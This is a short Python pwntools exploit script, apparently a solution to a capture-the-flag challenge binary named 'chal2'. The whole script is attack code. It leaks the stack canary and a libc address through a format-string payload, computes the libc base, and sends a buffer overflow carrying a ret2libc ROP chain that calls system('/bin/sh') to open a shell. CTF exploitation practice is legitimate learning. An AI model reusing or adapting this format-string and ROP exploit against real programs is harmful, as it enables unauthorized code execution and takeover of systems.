#!/usr/bin/env python3 
from pwn import *

context.update(arch='amd64', os='linux')
# context.log_level = "debug"

chall = "./chal2"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process(chall)

emoji1 = b"\xf0\x9f\xa7\x91"  # 🧑
emoji2 = b"\xf0\x9f\x90\xa6"  # 🐦


# canary and libc leak
p.sendlineafter(emoji1 + b" > ", b"%15$p.%19$p")
p.recvuntil(emoji2 + b" > ")
leak = p.recvuntil(emoji1, drop=True).strip().split(b".")
canary = int(leak[0], 16)
libc_leak = int(leak[1], 16)
log.info("canary: " + hex(canary))
log.info("libc_leak: " + hex(libc_leak))


# calculate libc base
offset = -54
libc_base = libc_leak - libc.sym['__libc_start_main'] - offset
libc.address = libc_base
assert libc_base & 0xff == 0
log.info("libc base: " + hex(libc_base))


# rop
rop = ROP(libc)
payload = b"A"*72 + p64(canary) + b"B"*8
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.sym['system'])
p.sendlineafter(b"> ", payload)

p.interactive()
